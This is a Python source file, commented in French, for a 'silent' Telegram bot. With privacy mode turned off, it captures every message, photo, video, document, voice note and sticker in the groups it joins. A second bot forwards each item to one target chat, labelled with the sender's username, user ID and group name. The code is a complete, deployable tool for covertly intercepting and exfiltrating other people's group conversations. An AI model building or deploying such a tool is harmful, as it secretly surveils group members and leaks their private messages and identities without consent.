import os
import logging
import asyncio
from asyncio import Queue

from telegram import Bot, Update
from telegram.ext import Application, ContextTypes, MessageHandler, filters
from telegram.error import TimedOut, NetworkError

from aiohttp import web

# ============ CONFIG (via env vars en prod) ============
TOKEN_SOURCE = os.getenv("TOKEN_BOT1", "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11")  # Bot qui écoute (silencieux)
TOKEN_DEST   = os.getenv("TOKEN_BOT2", "987654:XYZ-ABCDEF9876ghIkl-zyx99W9v9u987ew22")  # Bot qui t'envoie
TARGET_CHAT_ID = int(os.getenv("TARGET_CHAT_ID", "123456789"))  # TON ID Telegram

WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # En prod : https://ton-url.onrender.com/webhook
PORT = int(os.getenv("PORT", 10000))  # Render utilise souvent 10000

# ===========================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

queue = Queue()
bot_dest = Bot(TOKEN_DEST)

# Worker qui forwarde avec rate limit
async def worker():
    while True:
        try:
            update = await queue.get()
            message = update.effective_message
            user = update.effective_user
            username = user.username or user.full_name or "Inconnu"
            chat_title = update.effective_chat.title or "Privé"

            prefix = f"✉ De @{username} ({user.id})\n📍 Groupe: {chat_title}"

            sent = False
            try:
                if message.text:
                    await bot_dest.send_message(TARGET_CHAT_ID, f"{prefix}\n\n{message.text}")
                    sent = True
                elif message.photo:
                    await bot_dest.send_photo(TARGET_CHAT_ID, message.photo[-1].file_id, caption=prefix)
                    sent = True
                elif message.video:
                    await bot_dest.send_video(TARGET_CHAT_ID, message.video.file_id, caption=prefix)
                    sent = True
                elif message.document:
                    await bot_dest.send_document(TARGET_CHAT_ID, message.document.file_id, caption=prefix)
                    sent = True
                elif message.voice:
                    await bot_dest.send_voice(TARGET_CHAT_ID, message.voice.file_id, caption=prefix)
                    sent = True
                elif message.sticker:
                    await bot_dest.send_sticker(TARGET_CHAT_ID, message.sticker.file_id)
                    await bot_dest.send_message(TARGET_CHAT_ID, f"{prefix}\nSticker {message.sticker.emoji}")
                    sent = True
                # Ajoute plus de types si besoin (audio, etc.)

                if sent:
                    logger.info(f"Forward OK ← @{username} | {chat_title}")

            except (TimedOut, NetworkError):
                await asyncio.sleep(5)
                queue.put_nowait(update)  # Retry
            except Exception as e:
                logger.error(f"Erreur envoi: {e}")

            await asyncio.sleep(0.05)  # Rate limit safe (~20 msg/s)
            queue.task_done()

        except Exception as e:
            logger.error(f"Worker erreur: {e}")
            await asyncio.sleep(10)

# Handler qui capture TOUT (privacy OFF requise)
async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_message:
        await queue.put(update)

# Webhook handler
async def webhook(request):
    if request.method == "POST":
        try:
            json_data = await request.json()
            update = Update.de_json(json_data, application.bot)
            if update:
                await application.process_update(update)
        except Exception as e:
            logger.error(f"Webhook erreur: {e}")
    return web.Response(text="OK")

# Main
async def main():
    global application
    application = Application.builder().token(TOKEN_SOURCE).build()

    application.add_handler(MessageHandler(filters.ALL, catch_all))

    asyncio.create_task(worker())

    await application.initialize()
    
    # Setup webhook si URL fournie
    if WEBHOOK_URL:
        await application.bot.set_webhook(url=WEBHOOK_URL)
        logger.info(f"Webhook set → {WEBHOOK_URL}")
    else:
        logger.warning("Pas de WEBHOOK_URL → mode polling (pour test local)")

    # Serveur aiohttp
    app = web.Application()
    app.router.add_post("/webhook", webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()

    logger.info(f"Bot silencieux lancé sur port {PORT}")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
